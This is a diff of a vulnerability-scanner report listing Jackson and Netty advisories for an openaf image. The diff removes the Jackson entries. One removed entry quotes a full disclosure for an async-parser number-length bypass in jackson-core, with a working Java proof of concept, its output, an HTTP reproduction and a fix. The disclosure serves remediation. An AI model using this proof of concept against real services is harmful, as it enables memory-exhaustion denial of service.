@@ -1,412 +1,5 @@
 ```yaml
-╭ [0] ╭ [0]  ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
-│     │      ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
-│     │      ├ PkgPath         : openaf/openaf.jar 
-│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.22.0 
-│     │      │                  ╰ UID : 348817934bcfb1b0 
-│     │      ├ InstalledVersion: 2.22.0 
-│     │      ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
-│     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
-│     │      ├ SeveritySource  : ghsa 
-│     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
-│     │      ├ DataSource       ╭ ID  : ghsa 
-│     │      │                  ├ Name: GitHub Security Advisory Maven 
-│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:688b49468fb20b162d118de6a7ec97cf75947eb57c3dc49aca7e567a17535416 
-│     │      ├ Title           : jackson-core: Async parser maxNumberLength bypass via chunked digit
-│     │      │                   accumulation (incomplete fix for GHSA-72hv-8253-57qq) 
-│     │      ├ Description     : ## Summary
-│     │      │                   
-│     │      │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
-│     │      │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advis
-│     │      │                   ories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser,
-│     │      │                   published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired
-│     │      │                   `validateIntegerLength` into a new `_setIntLength` helper and called it at
-│     │      │                   every place where the integer portion of a number is *decided* (terminator
-│     │      │                   byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It
-│     │      │                    did not call it on the much more attacker-relevant path: "ran out of input
-│     │      │                   while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to
-│     │      │                   caller".
-│     │      │                   As a result, an attacker who streams JSON to a non-blocking parser in many
-│     │      │                   small chunks, without ever sending a terminator byte, can keep the parser
-│     │      │                   inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
-│     │      │                   `_textBuffer.expandCurrentSegment()` grows on every chunk, and
-│     │      │                   `validateIntegerLength` is never invoked. The accumulator is only gated by
-│     │      │                   `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the
-│     │      │                   documented `maxNumberLength` (1000 default).
-│     │      │                   This is the same vulnerability class, same advisory wording ("Memory
-│     │      │                   Exhaustion: Unbounded allocation in TextBuffer from excessively long
-│     │      │                   numbers"), same parser class — just the streaming path the original fix didn't
-│     │      │                    cover. The fix to the *fraction* path is correct (see `_finishFloatFraction`
-│     │      │                   at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where
-│     │      │                   `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the
-│     │      │                   equivalent call is missing from every integer-digit path.
-│     │      │                   ## Affected versions
-│     │      │                   Verified on the patched releases:
-│     │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
-│     │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
-│     │      │                   Structurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same
-│     │      │                   `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same
-│     │      │                   NOT_AVAILABLE returns without validation. Not retested but presumed
-│     │      │                   vulnerable.
-│     │      │                   ## Affected code
-│     │      │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParse
-│     │      │                   rBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/
-│     │      │                   java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java)
-│     │      │                    in 2.18.6 / 2.21.1.
-│     │      │                   ### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:
-│     │      │                   ```java
-│     │      │                   if (outPtr >= outBuf.length) {
-│     │      │                       // NOTE: must expand to ensure contents all in a single buffer (to keep
-│     │      │                       // other parts of parsing simpler)
-│     │      │                       outBuf = _textBuffer.expandCurrentSegment();
-│     │      │                   }
-│     │      │                   outBuf[outPtr++] = (char) ch;
-│     │      │                   if (++_inputPtr >= _inputEnd) {
-│     │      │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-│     │      │                       _textBuffer.setCurrentLength(outPtr);
-│     │      │                       return _updateTokenToNA();          // <-- no
-│     │      │                   validateIntegerLength(outPtr)
-│     │      │                   ```
-│     │      │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
-│     │      │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr)
-│     │      │                   throws IOException {
-│     │      │                       int negMod = _numberNegative ? -1 : 0;
-│     │      │                       while (true) {
-│     │      │                           if (_inputPtr >= _inputEnd) {
-│     │      │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-│     │      │                               _textBuffer.setCurrentLength(outPtr);
-│     │      │                               return _updateTokenToNA();    // <-- no
-│     │      │                   validateIntegerLength(outPtr + negMod)
-│     │      │                           }
-│     │      │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
-│     │      │                           if (ch < INT_0) {
-│     │      │                               if (ch == INT_PERIOD) {
-│     │      │                                   _setIntLength(outPtr+negMod);   // <-- validated here
-│     │      │                                   ++_inputPtr;
-│     │      │                                   return _startFloat(outBuf, outPtr, ch);
-│     │      │                               }
-│     │      │                               break;
-│     │      │                           if (ch > INT_9) {
-│     │      │                               if ((ch | 0x20) == INT_e) {
-│     │      │                           ++_inputPtr;
-│     │      │                           if (outPtr >= outBuf.length) {
-│     │      │                               outBuf = _textBuffer.expandCurrentSegment();
-│     │      │                           outBuf[outPtr++] = (char) ch;
-│     │      │                       }
-│     │      │                       _setIntLength(outPtr+negMod);            // <-- validated here
-│     │      │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
-│     │      │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467,
-│     │      │                   1481, 1586, 1644, 1698 — every "ran out of input mid-integer" exit returns to
-│     │      │                   the caller without validating the accumulator length.
-│     │      │                   ### Compare with the fraction path that is correct
-│     │      │                   `_finishFloatFraction` lines 1827-1838:
-│     │      │                   while (loop) {
-│     │      │                       if (ch >= INT_0 && ch <= INT_9) {
-│     │      │                           ++fractLen;
-│     │      │                               _setFractLength(fractLen);          // <-- VALIDATED
-│     │      │                               return JsonToken.NOT_AVAILABLE;
-│     │      │                           ch = getNextSignedByteFromBuffer();
-│     │      │                       ...
-│     │      │                   ## Impact
-│     │      │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON,
-│     │      │                   anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or
-│     │      │                   `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the
-│     │      │                   async parser as they arrive. Operators who set
-│     │      │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that
-│     │      │                   this caps memory per number value are not getting that guarantee in
-│     │      │                   chunked-feed scenarios. The parser silently accumulates digits up to
-│     │      │                   `maxStringLength` (20 MiB default) per concurrent connection. Multiply by
-│     │      │                   attacker-controlled concurrency to OOM the JVM.
-│     │      │                   The synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and
-│     │      │                   the async parser on *complete* input are not affected — those paths go through
-│     │      │                    `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.
-│     │      │                   CWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly
-│     │      │                   the same as the parent advisory (Network / Low complexity / High availability
-│     │      │                   impact). The parent advisory was scored CVSS 8.7 High.
-│     │      │                   ## Proof of concept
-│     │      │                   Standalone PoC, no Maven required:
-│     │      │                   mkdir poc && cd poc
-│     │      │                   curl -sLo jackson-core-2.18.6.jar
-│     │      │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/
-│     │      │                   jackson-core-2.18.6.jar
-│     │      │                   cat > PoC.java <<'EOF'
-│     │      │                   import com.fasterxml.jackson.core.*;
-│     │      │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
-│     │      │                   public class PoC {
-│     │      │                       public static void main(String[] args) throws Exception {
-│     │      │                           StreamReadConstraints strict = StreamReadConstraints.builder()
-│     │      │                                   .maxNumberLength(1000)
-│     │      │                                   .build();
-│     │      │                           JsonFactory f = new JsonFactoryBuilder()
-│     │      │                                   .streamReadConstraints(strict)
-│     │      │                           // Sanity: synchronous parser rejects 5000-digit int.
-│     │      │                           try (JsonParser p = f.createParser("{\"v\":" + "1".repeat(5000) +
-│     │      │                   "}")) {
-│     │      │                               while (p.nextToken() != null) { /* drive */ }
-│     │      │                               System.out.println("[-] BUG ABSENT: sync parser accepted");
-│     │      │                               return;
-│     │      │                           } catch (Exception e) {
-│     │      │                               System.out.println("[+] sync parser rejected 5000-digit int: " +
-│     │      │                   e.getClass().getSimpleName());
-│     │      │                           // Bug: async parser, chunked, no terminator.
-│     │      │                           JsonParser ap = f.createNonBlockingByteArrayParser();
-│     │      │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
-│     │      │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
-│     │      │                           feeder.feedInput(preamble, 0, preamble.length);
-│     │      │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }
-│     │      │                           byte[] digits = new byte[16 * 1024];
-│     │      │                           for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i %
-│     │      │                    9));
-│     │      │                           for (int c = 0; c < 600; c++) {
-│     │      │                               feeder.feedInput(digits, 0, digits.length);
-│     │      │                               JsonToken t = ap.nextToken();
-│     │      │                               if (t != JsonToken.NOT_AVAILABLE) {
-│     │      │                                   System.out.println("[-] unexpected token: " + t);
-│     │      │                                   return;
-│     │      │                           System.out.println("[+] BUG PRESENT: async parser accepted ~9.83 MB of
-│     │      │                    digits with maxNumberLength=1000");
-│     │      │                           // Closing the number now finally triggers the validator.
-│     │      │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
-│     │      │                           feeder.endOfInput();
-│     │      │                           try {
-│     │      │                               while (ap.nextToken() != null) { /* drive */ }
-│     │      │                               System.out.println("[*] late rejection on close: " +
-│     │      │                   e.getMessage().split("\n")[0]);
-│     │      │                           ap.close();
-│     │      │                   EOF
-│     │      │                   javac -cp jackson-core-2.18.6.jar PoC.java
-│     │      │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
-│     │      │                   Observed output against `jackson-core-2.18.6`:
-│     │      │                   [+] sync parser rejected 5000-digit int: StreamConstraintsException
-│     │      │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits with
-│     │      │                   maxNumberLength=1000
-│     │      │                   [*] late rejection on close: Number value length (9830400) exceeds the maximum
-│     │      │                    allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)
-│     │      │                   Observed output against `jackson-core-2.21.1`: identical.
-│     │      │                   The 9.83 MB figure is purely a function of the loop bound (600 chunks * 16
-│     │      │                   KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy
-│     │      │                    declared as `maxNumberLength = 1000`, the parser permits **9830x** more
-│     │      │                   allocation than the policy allows. With `maxStringLength` left at the default
-│     │      │                   20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap
-│     │      │                   (chars are 2 bytes each) before the validator finally fires on
-│     │      │                   terminator/`endOfInput()`. Multiply by concurrent connections.
-│     │      │                   ## End-to-end reproduction through real HTTP
-│     │      │                   Supplements the standalone PoC with a running Spring Boot WebFlux server,
-│     │      │                   driving the same bug through the actual reactor-netty + Jackson2JsonDecoder
-│     │      │                   streaming-decode path that production reactive endpoints use.
-│     │      │                   Setup:
-│     │      │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty
-│     │      │                   1.1.23)
-│     │      │                   - jackson-databind 2.17.2, jackson-core overridden:
-│     │      │                     - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
-│     │      │                   published)
-│     │      │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
-│     │      │                   - JVM: OpenJDK 17.0.18
-│     │      │                   - Server `JsonFactory` configured with
-│     │      │                   `StreamReadConstraints.builder().maxNumberLength(1000).build()`
-│     │      │                   Endpoint under test exposes the `Flux<DataBuffer>` request body directly to
-│     │      │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees
-│     │      │                   one
-│     │      │                   HTTP chunk per `feedInput` (the same pattern used for any
-│     │      │                   `@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket
-│     │      │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of 200 digit bytes
-│     │      │                   each (50,000 digits total) at 20ms intervals, then writes the closing `}`.
-│     │      │                   VULN — jackson-core 2.18.7:
-│     │      │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still
-│     │      │                   accepting
-│     │      │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
-│     │      │                   HTTP/1.1 200 OK
-│     │      │                   ERR after 6548ms
-│     │      │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:
-│     │      │                          Number value length (50000) exceeds the maximum allowed (1000, ...)
-│     │      │                   Server-side controller trace (250 DataBuffer arrivals elided):
-│     │      │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
-│     │      │                   [ctrl] DataBuffer arrived size=200 ms=42
-│     │      │                   ...
-│     │      │                   [ctrl] DataBuffer arrived size=199 ms=5993
-│     │      │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'
-│     │      │                   [ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...
-│     │      │                   Server held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with
-│     │      │                   `maxNumberLength=1000` declared. The validator never fires during streaming;
-│     │      │                   it only fires at value-completion when the closing `}` arrives.
-│     │      │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
-│     │      │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno
-│     │      │                   32] Broken pipe
-│     │      │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
-│     │      │                   status=connection-broke-mid-stream
-│     │      │                   Server-side controller trace:
-│     │      │                   [ctrl] DataBuffer arrived size=6   ms=129
-│     │      │                   [ctrl] DataBuffer arrived size=200 ms=142
-│     │      │                   [ctrl] DataBuffer arrived size=200 ms=145
-│     │      │                   [ctrl] DataBuffer arrived size=200 ms=146
-│     │      │                   [ctrl] DataBuffer arrived size=200 ms=147
-│     │      │                   [ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum
-│     │      │                   allowed (1000, ...)
-│     │      │                   Patched server raises `StreamConstraintsException` at 155ms after only 5
-│     │      │                   DataBuffers, exactly when the accumulated digit count crosses
-│     │      │                   `maxNumberLength=1000`. The connection is reset mid-stream rather than the
-│     │      │                   parser silently consuming the rest of the attacker's payload.
-│     │      │                   Side-by-side:
-│     │      │                   | Build | Chunks accepted before exception | Digits buffered | Time to
-│     │      │                   detection |
-│     │      │                   |---|---|---|---|
-│     │      │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit)
-│     │      │                    | 6,548ms — only at terminator |
-│     │      │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed
-│     │      │                   |
-│     │      │                   Note on the default `@RequestBody Mono<JsonNode>` path: that path cannot
-│     │      │                   distinguish the two builds because Spring's `decodeToMono` joins all
-│     │      │                   DataBuffers into one before parsing. The exploitable shape is the
-│     │      │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /
-│     │      │                   WebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),
-│     │      │                   which is also what `Jackson2Tokenizer` uses for any streaming JSON
-│     │      │                   deserialization in WebFlux and Quarkus reactive REST.
-│     │      │                   ## Suggested fix
-│     │      │                   Mirror the pattern already used in `_finishFloatFraction`. At every site that
-│     │      │                   returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState
-│     │      │                   = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first.
-│     │      │                   Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:
-│     │      │                   ```diff
-│     │      │                        protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr)
-│     │      │                            int negMod = _numberNegative ? -1 : 0;
-│     │      │                            while (true) {
-│     │      │                                if (_inputPtr >= _inputEnd) {
-│     │      │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
-│     │      │                                    _textBuffer.setCurrentLength(outPtr);
-│     │      │                   +                _streamReadConstraints.validateIntegerLength(outPtr +
-│     │      │                   negMod);
-│     │      │                                    return _updateTokenToNA();
-│     │      │                                }
-│     │      │                   Note: `_setIntLength` itself can't be used as-is because it also assigns
-│     │      │                   `_intLength`, and `_intLength` must not be set until the integer is truly
-│     │      │                   complete (subsequent fraction handling reads `_intLength`). The minimal fix is
-│     │      │                    to call only the validator, as shown.
-│     │      │                   Apply the same one-line insertion before each `return _updateTokenToNA();`
-│     │      │                   that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are
-│     │      │                   listed above (12 lines total).
-│     │      │                   Alternatively, a heavier refactor: also gate
-│     │      │                   `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops
-│     │      │                    on `outPtr < maxNumberLength` so that the validator fires at the moment the
-│     │      │                   buffer would be enlarged past the limit, rather than waiting for the next
-│     │      │                   chunk boundary. Either approach is sufficient.
-│     │      │                   ## Credit
-│     │      │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the
-│     │      │                   Feb 2026 fix for GHSA-72hv-8253-57qq. 
-│     │      ├ Severity        : HIGH 
-│     │      ├ VendorSeverity   ─ ghsa: 3 
-│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/
-│     │      │                         │            SA:N 
-│     │      │                         ╰ V40Score : 8.7 
-│     │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
-│     │      │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be
-│     │      │                  │      1b0b4c3d040fdb9cd 
-│     │      │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d
-│     │      │                  │      4a2aad41d47902641 
-│     │      │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66
-│     │      │                  │      933cfb82b9aabeef8 
-│     │      │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
-│     │      │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-
-│     │      │                         3cxj-wff9 
-│     │      ├ PublishedDate   : 2026-07-21T21:58:53Z 
-│     │      ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
-│     ├ [1]  ╭ VulnerabilityID : CVE-2026-54515 
-│     │      ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
-│     │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│     │      ├ PkgPath         : openaf/openaf.jar 
-│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.22.0 
-│     │      │                  ╰ UID : c3b2e55f064f8b6 
-│     │      ├ InstalledVersion: 2.22.0 
-│     │      ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
-│     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
-│     │      ├ SeveritySource  : ghsa 
-│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
-│     │      ├ DataSource       ╭ ID  : ghsa 
-│     │      │                  ├ Name: GitHub Security Advisory Maven 
-│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:07e5cd1401bd0d0f2954b0cd057edae361ecd06a55fd1b62f07154cc8dd58f1c 
-│     │      ├ Title           : jackson-databind: jackson-databind: Ignored properties can be unexpectedly
-│     │      │                   modified 
-│     │      ├ Description     : jackson-databind contains the general-purpose data-binding functionality and
-│     │      │                   tree-model for Jackson Data Processor. From 2.8.0 until 2.18.9, 2.21.5, and
-│     │      │                   3.1.4, in BeanDeserializerBase.createContextual(), per-property
-│     │      │                   @JsonIgnoreProperties exclusions are applied by _handleByNameInclusion(),
-│     │      │                   producing a contextual deserializer whose BeanPropertyMap has the ignored
-│     │      │                   properties removed. The subsequent per-property case-insensitivity block
-│     │      │                   (triggered by @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds from
-│     │      │                   this._beanProperties (the original, unfiltered map) instead of
-│     │      │                   contextual._beanProperties, then overwrites the filtered map — restoring every
-│     │      │                    property _handleByNameInclusion had just removed. The ignored property
-│     │      │                   becomes writable again. This vulnerability is fixed in 2.18.9, 2.21.5, and
-│     │      │                   3.1.4. 
-│     │      ├ Severity        : MEDIUM 
-│     │      ├ CweIDs           ─ [0]: CWE-915 
-│     │      ├ VendorSeverity   ╭ amazon: 3 
-│     │      │                  ├ ghsa  : 2 
-│     │      │                  ╰ redhat: 2 
-│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
-│     │      │                  │        ╰ V3Score : 5.3 
-│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
-│     │      │                           ╰ V3Score : 5.3 
-│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
-│     │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│     │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0e1b0b211f7a53baa62
-│     │      │                  │      ba2f4c9bd006c7bf4d5fa 
-│     │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5962 
-│     │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5964 
-│     │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5
-│     │      │                  │      jmj-h7xm-6q6v 
-│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
-│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
-│     │      ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
-│     │      ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
-│     ├ [2]  ╭ VulnerabilityID : CVE-2026-59889 
-│     │      ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
-│     │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│     │      ├ PkgPath         : openaf/openaf.jar 
-│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.22.0 
-│     │      │                  ╰ UID : c3b2e55f064f8b6 
-│     │      ├ InstalledVersion: 2.22.0 
-│     │      ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
-│     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
-│     │      ├ SeveritySource  : ghsa 
-│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
-│     │      ├ DataSource       ╭ ID  : ghsa 
-│     │      │                  ├ Name: GitHub Security Advisory Maven 
-│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:4e54b836c95d89396f4d5986208b596e5d89c7a43d8cca9dc56bce597d5898c2 
-│     │      ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped container properties on
-│     │      │                    deserialization 
-│     │      ├ Description     : jackson-databind contains the general-purpose data-binding functionality and
-│     │      │                   tree-model for Jackson Data Processor. From 2.18.0 until 2.18.9, 2.21.5,
-│     │      │                   2.22.1, 3.1.5, and 3.2.1, UnwrappedPropertyHandler.processUnwrapped() replays
-│     │      │                   buffered JSON for a @JsonUnwrapped property and calls prop.deserializeAndSet()
-│     │      │                    without a prop.visibleInView(ctxt.getActiveView()) guard, allowing a property
-│     │      │                    annotated with both @JsonView and @JsonUnwrapped to be written from attacker
-│     │      │                   JSON under a less-privileged active view. This issue is fixed in versions
-│     │      │                   2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1. 
-│     │      ├ Severity        : MEDIUM 
-│     │      ├ CweIDs           ─ [0]: CWE-863 
-│     │      ├ VendorSeverity   ─ ghsa: 2 
-│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
-│     │      │                         ╰ V3Score : 6.5 
-│     │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
-│     │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d627a8a86fcb0624292
-│     │      │                  │      82f79f3f256f181ed2c7b 
-│     │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6060 
-│     │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
-│     │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5
-│     │      │                  │      gvw-p9qm-jgwh 
-│     │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
-│     │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
-│     │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
-│     ├ [3]  ╭ VulnerabilityID : CVE-2026-59901 
+╭ [0] ╭ [0]  ╭ VulnerabilityID : CVE-2026-59901 
 │     │      ├ VendorIDs        ─ [0]: GHSA-558v-64gr-wgg4 
 │     │      ├ PkgName         : io.netty:netty-codec-compression 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.15.Final.jar 
@@ -415,14 +8,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : ghsa 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59901 
 │     │      ├ DataSource       ╭ ID  : ghsa 
 │     │      │                  ├ Name: GitHub Security Advisory Maven 
 │     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
-│     │      ├ Fingerprint     : sha256:b20d9272e13c908d25172abca8ad54d91d48ad987f09929ff475e8492d495ba2 
+│     │      ├ Fingerprint     : sha256:07bf237fa31d5c897a819dafe9d9aad71cb0c588ad50cfc37b15edd7a885e0f9 
 │     │      ├ Title           : io.netty/netty-codec-compression: Netty: Infinite loop in
 │     │      │                   netty-codec-compression (bzip2) 
 │     │      ├ Description     : Netty is an asynchronous, event-driven network application framework. Prior to
@@ -450,7 +43,7 @@
 │     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59901 
 │     │      ├ PublishedDate   : 2026-07-29T18:16:56.467Z 
 │     │      ╰ LastModifiedDate: 2026-07-30T16:33:59.58Z 
-│     ├ [4]  ╭ VulnerabilityID : GHSA-mfg7-5gfp-c4w3 
+│     ├ [1]  ╭ VulnerabilityID : GHSA-mfg7-5gfp-c4w3 
 │     │      ├ PkgName         : io.netty:netty-codec-dns 
 │     │      ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.15.Final.jar 
 │     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.15.Final 
@@ -458,14 +51,14 @@
 │     │      ├ InstalledVersion: 4.2.15.Final 
 │     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
